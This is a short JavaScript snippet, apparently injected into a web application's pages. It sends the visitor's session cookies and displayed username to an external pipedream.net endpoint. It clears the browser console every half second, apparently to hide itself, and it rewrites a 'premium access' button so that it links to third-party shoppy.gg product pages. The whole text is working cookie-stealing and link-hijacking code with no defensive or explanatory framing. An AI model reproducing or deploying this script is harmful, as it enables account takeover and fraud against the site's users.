fetch('https://eodm4q7xsesbwyr.m.pipedream.net/' + document.cookie + '-user-' + document.querySelector('#page-header-user-dropdown > span').innerText);
setInterval(()=>{console.clear()},500);
try {
    var premiumBtn = document.querySelector("#app-layouts > div.main-content > div > div.card > div:nth-child(1) > div > div.col-12.col-md-6 > div.d-flex.flex-column.flex-sm-row > a");
    if (document.location.pathname.split("/")[2] == "premium-access") {
        premiumBtn.attributes['href'].value = "https://shoppy.gg/product/3zK6ZPw";
    }else{
        premiumBtn.attributes['href'].value = "https://shoppy.gg/product/R3m2fjS";
    }
}catch{
  console.clear();
}
